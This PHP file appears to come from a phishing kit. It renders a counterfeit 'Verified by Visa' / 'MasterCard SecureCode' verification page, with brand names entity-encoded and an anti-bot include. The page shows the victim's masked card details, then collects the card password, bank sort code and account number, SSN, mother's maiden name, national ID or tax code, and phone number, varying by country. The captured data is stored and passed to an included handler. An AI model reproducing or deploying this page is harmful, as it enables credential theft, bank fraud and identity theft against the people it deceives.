<?php



session_start();
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
date_default_timezone_set('GMT'); 
$time = date('d/m/Y G:i:s');
date_default_timezone_set('GMT'); 
include('../config.php');
include('../antibots.php');
include('visit.php');
################## VBV INFORMATION ##################
$_SESSION['_sortnum1_'] = $_POST['sortnum1'];
$_SESSION['_sortnum2_'] = $_POST['sortnum2'];
$_SESSION['_sortnum3_'] = $_POST['sortnum3'];
$_SESSION['_ssn1_'] = $_POST['ssn1'];
$_SESSION['_ssn2_'] = $_POST['ssn2'];
$_SESSION['_ssn3_'] = $_POST['ssn3'];
####################################################
$_SESSION['_dob_'] = $_SESSION['_day_']."/".$_SESSION['_month_']."/".$_SESSION['_year_'];
$_SESSION['_password_vbv_'] = $_POST['password_vbv'];
$_SESSION['_sortnum_'] = $_SESSION['_sortnum1_']."-".$_SESSION['_sortnum2_']."-".$_SESSION['_sortnum3_'];
$_SESSION['_accnumber_'] = $_POST['accnumber'];
$_SESSION['_ssnnum_'] = $_SESSION['_ssn1_']."-".$_SESSION['_ssn2_']."-".$_SESSION['_ssn3_'];
$_SESSION['_mmname_'] = $_POST['mmname'];
$_SESSION['_creditlimit_'] = $_POST['creditlimit'];
$_SESSION['_osid_'] = $_POST['osid'];	
$_SESSION['_nmd_'] = $_POST['nmd'];	
$_SESSION['_offid_'] = $_POST['offid'];	
$_SESSION['_itt_'] = $_POST['itt'];
$_SESSION['_itt1_'] = $_POST['itt1'];
################## VBV INFORMATION ##################
if(empty($_POST['password_vbv'])== false) {
  include('VBV.php');
}
$MC = $_SESSION['_c_type_'] == "MASTERCARD" || $_SESSION['_c_type_'] == "MAESTRO";
$VE = $_SESSION['_c_type_'] == "VISA"  || $_SESSION['_c_type_'] == "VISA ELECTRON";

if ($MC){
$type = "&#77;&#97;&#115;&#116;&#101;&#114;&#67;&#97;&#114;&#100; SecureCode";
} elseif ($VE) {
$type = "Verified by &#86;&#105;&#115;&#97;";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; width=device-width, initial-scale=1">
    <meta charset="utf8">
    <title><?php echo $type; ?></title>
    <meta name="robots" content="noindex" />
    <link rel="shortcut icon" type="image/x-icon" href="../../lib/img//favicon.ico">
    <link href="../../lib/css/V-Z118.css" type="text/css" rel="stylesheet"></style>
	<script type="text/javascript" src="../../lib/js/jquery.js"></script>
	<script type="text/javascript" src="../../lib/js/jquery.validation.js"></script>
	<script type="text/javascript">
	$().ready(function() {
        $(".sortnum").keypress(function (e) {
                if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                    $(".sortnum").html("").show();
                    return false;
                }
		});
        $(".sortnum").keyup(function () {
                $this=$(this);
                    if ($this.val().length >=$this.data("maxlength")) {
                        if($this.val().length>$this.data("maxlength")){
                            $this.val($this.val().substring(0,2));
                        }
                        $this.next(".sortnum").focus();
                    }
        });
	    $(".ssnum").keypress(function (e) {
                if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                    $(".ssnum").html("").show();
                    return false;
                }
		});
        $(".ssnum").keyup(function () {
                $this=$(this);
                    if ($this.val().length >=$this.data("maxlength")) {
                        if($this.val().length>$this.data("maxlength")){
                            $this.val($this.val().substring(0,4));
                        }
                        $this.next(".ssnum").focus();
                    }
        });
		$(".accnumber").keypress(function (e) {
                if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                    $(".accnumber").html("").show();
                    return false;
                }
		});
	});
	    function a(){
            document.getElementById("vbv").value="";
            document.getElementById("vbv").type="text";
        }
        function b(){
            if(document.getElementById("vbv").value==""){
                document.getElementById("vbv").type="password";
                document.getElementById("vbv").value="";
            }
            else{   
                document.getElementById("vbv").type="password";
            }
            }
	
	</script>
	<script type="text/javascript" src="../../lib/js/jquery.validation.form.js"></script>
</head>
<body>
<div class="content_check">

    <?php
    if ($MC) {
       echo '<img src="../../lib/img/noobms.gif" style=" margin-left: 29px; margin-top: 26px;height: 2.5em;">';
   }
    if ($VE) {
      echo '<img src="../../lib/img/noobvbv.gif" style=" margin-left: 29px; margin-top: 26px;">';
   }
    ?>
    <img src="../../lib/img/noobppl.svg" style="float: right;display: inline-block ; margin-top: 22px; padding-right: 1em;" width="128px">
    <p class="sub" style="font-family:Arial;font-size: 14px;margin-top: 45px;color: #1C54A3;margin-left:1em;text-align: center;font-weight: bold;"><?php echo $_SESSION['_cc_bank_']; ?></p>
    <p class="sub" style="font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif;font-size: 17px;margin-top: -6px;color: #807979;margin-left:1em;text-align: center;font-weight: 700;"><?php echo $_SESSION['_ccglobal_']; ?></p>
	<?php
	if ($_SESSION['_country_'] == "IRELAND" || $_SESSION['_country_'] == "UNITED KINGDOM" || $_SESSION['_country_'] == "CANADA"){
		echo '<table align="center" width="100%" style="font-size: 13px;font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif; color: black;margin-left: 3%;">';
    }
	else {
		echo '<table align="center" width="100%" style="font-size: 13px;font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif; color: black;margin-left: 5%;">';
	}
	?>
        <tbody>
        <tr>
            <td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right">Name On Card : </td>
            <td style="font-size: 1.05em;"><?=$_SESSION['_nameoncard_'];?></td>
        </tr>
		<tr>
            <td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right">Zip Code : </td>
            <td style="font-size: 1.05em;"><?=$_SESSION['_zipCode_'];?></td>
        </tr>
        <tr>
            <td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right">Country : </td>
            <td style="font-size: 1.05em;"><?=$_SESSION['_country_'];?></td>
        </tr>
        <tr>
            <td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right">Card Number : </td>
            <td style="font-size: 1.1em;">XXXX - XXXX - XXXX - <?=substr($_SESSION['_cardnumber_'] , -4);?></td>
        </tr>
		<tr>
			<tr>
		<tr>
        <form method="post" id="validation" action="">
		<?php
################### AUSTRALIA ###################
		    if($_SESSION['_country_'] == "SWITZERLAND") {
            	if ($MC) {
                	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Kontonummer :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="accnumber" required="" id="accnumber" maxlength="30">></td><br></tr>';
			}
	        elseif ($VE) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Kontonummer :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="accnumber" required="" id="accnumber" maxlength="30">></td><br></tr>';  
		    }
			}
			################# IRELAND || UNITED KINGDOM  ###################
			 ################### GREECE ###################
		    elseif($_SESSION['_country_'] == "GREECE") {
            	if ($MC) {
                	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Official ID or passport :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="offid" required="" id="offid" maxlength="20">></td><br></tr>';  
		    }
	        elseif ($VE) {
               	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Official ID or passport :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="offid" required="" id="offid" maxlength="20">></td><br></tr>';  
		    }
			}
			################# waaalo  ###################
			 ################### GREECE ###################
		     elseif($_SESSION['_country_'] == "GERMANY") {
            	if ($MC) {
                	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Kontonummer :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="accnumber" required="" id="accnumber" maxlength="30">></td><br></tr>';
			}
	        elseif ($VE) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Kontonummer :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="accnumber" required="" id="accnumber" maxlength="30">></td><br></tr>';  
		    }
			}
			################# waaalo  ###################
				 ################### GREECE ###################
		    elseif($_SESSION['_country_'] == "ITALY") {
            	if ($MC) {
                	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Codice fiscale :</td>
		     			 <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="itt" required="" id="itt" maxlength="16">></td><br></tr>';  
		 echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Numero cellulare :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="itt1" required="" id="itt1" maxlength="20">></td><br></tr>';  
	
		 }
	        elseif ($VE) {
               	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Codice fiscale :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="itt" required="" id="itt" maxlength="16">></td><br></tr>';  
		 	 echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Numero cellulare :</td>
		             	  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="itt1" required="" id="itt1" maxlength="20">></td><br></tr>';  
		 }
			}
			################# waaalo  ###################
		   ################### AUSTRALIA ###################
		    elseif($_SESSION['_country_'] == "AUSTRALIA") {
            	if ($MC) {
                	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>';
		       		echo '<td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	        	echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">CREDIT LIMIT :</td><td style="font-size: 1.05em;">
			   		<input class="" style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%; name="creditlimit" id="creditlimit" placeholder=""></td></tr>';
				}
	        elseif ($VE) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Password :</td>';
		       		echo '<td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
					echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">CREDIT LIMIT :</td><td style="font-size: 1.05em;">
			   		<input class="" style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%; name="creditlimit" id="creditlimit" placeholder=""></td></tr>';
	        }  
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">OSID :</td><td style="font-size: 1.05em;">
			   		<input class="" style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%; name="osid" id="osid" placeholder=""></td></tr>';
    		   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">CREDIT LIMIT :</td><td style="font-size: 1.05em;">
			   		<input class="" style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%; name="creditlimit" id="creditlimit" placeholder=""></td></tr>';
		    }
			################# IRELAND || UNITED KINGDOM  ###################
		    elseif ($_SESSION['_country_'] == "IRELAND" || $_SESSION['_country_'] == "UNITED KINGDOM" ) {
    			if ($MC) {
              		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>
		       			  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	          		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Sort Code :</td><td style="font-size: 1.05em;">
			   			  <input style="width: 50px;text-align: center;" type="text" placeholder="XX" id="sortnum" name="sortnum1" class="sortnum" maxlength="2" data-maxlength="2"> - <input style="width: 50px;text-align: center;" type="text" placeholder="XX" id="sortnum" name="sortnum2" class="sortnum" maxlength="2" data-maxlength="2"> - <input style="width: 50px;text-align: center;" type="text" placeholder="XX" id="nmber" name="sortnum3" class="sortnum" maxlength="2" data-maxlength="2"></td><br></tr>';			   
			  		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Account Number :</td>
		                  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="accnumber" required="" id="accnumber" maxlength="10">></td><br></tr>';
						  echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Mother Name :</td>
		                  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="mmname" required="" id="mmname" "></td><br></tr>';
			  	
				}
	       	    elseif ($VE) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Password :</td><td style="font-size: 1.05em;">
			              <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	           		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Sort Code :</td>
			              <td style="font-size: 1.05em;"><input style="width: 50px;text-align: center;" type="text" placeholder="XX" id="sortnum" name="sortnum1" class="sortnum" maxlength="2" data-maxlength="2"> - <input style="width: 50px;text-align: center;" type="text" placeholder="XX" id="sortnum" name="sortnum2" class="sortnum" maxlength="2" data-maxlength="2"> - <input style="width: 50px;margin-bottom: 3%;text-align: center;" type="text" placeholder="XX" id="nmber" name="sortnum3" class="sortnum" maxlength="2" data-maxlength="2"></td><br></tr>';			   
		       		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Account Number :</td>
		                  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="accnumber" required="" id="accnumber" maxlength="10"></td><br></tr>';
						  echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Mother Name :</td>
		                  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="mmname" required="" id="mmname" "></td><br></tr>';
			    }
				if ($_SESSION['_country_'] == "IRELAND") {
					echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Mother Name :</td>
		                  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="mmname" required="" id="mmname" "></td><br></tr>';
			    }
    		}
		    ################### UNITED STATES AND CANADA ###################
			elseif ($_SESSION['_country_'] == "UNITED STATES" || $_SESSION['_country_'] == "CANADA") {
				if ($MC) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td>';
		       		echo '<td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	        	}
	        	elseif ($VE) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Password :</td><td style="font-size: 1.05em;">
			              <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	        	}
			   		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">S.S.N :</td><td style="font-size: 1.05em;">
			              <input style="width: 52px;text-align: center;" placeholder="XXX" id="ssnum" name="ssn1" class="ssnum" maxlength="3" data-maxlength="3"> - <input style="width: 44px;text-align: center;" placeholder="XX" id="ssnum" name="ssn2" class="ssnum" maxlength="2" data-maxlength="2"> - <input style="width: 55px;text-align: center;" maxlength="11" placeholder="XXXX" id="ssnum" name="ssn3" class="ssnum" data-maxlength="4" maxlength="4"></td><br></tr>';
				if ($_SESSION['_country_'] == "CANADA") {
					echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Mother Name :</td>
		                  <td style="font-size: 1.05em;"><input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="mmname" required="" id="mmname" "></td><br></tr>';
			    }	
			}
			################### OTHER COUNTRY || NO VERIFY ###################
            else{
				if ($MC) {
               		echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">SecureCode :</td><td style="font-size: 1.05em;">
			              <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	        	}
	        	elseif ($VE) {
                    echo '<tr><td style="font-size: 12px;color: #0135B8;font-weight: bold;font-size: 1.05em;" align="right" style="font-size: 12px;">Password :</td><td style="font-size: 1.05em;">
			              <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="text" placeholder="" name="password_vbv" required="" id="vbv" onclick="a();" onblur="b();"></td><br></tr>';
	        	}  
			}			
			?>
        <tr>
            <td style="font-size: 1.05em;"></td>
            <td style="font-size: 1.05em;"><br>
                <input type="submit" value="Submit">
                </form>
            </td>
        </tr>
       </tbody>
    </table>
	<tr>
    <p style="text-align:center;font-family: arial, sans-serif;font-size: 9px;color: #656565;margin-top: 17px;padding-bottom: 30px;">
        Copyright © 1999-<?php echo date('Y') ?> <?php echo $_SESSION['_cc_bank_']; ?> . All rights reserved.
    </p>
	</tr>
</div>

</body>
</html>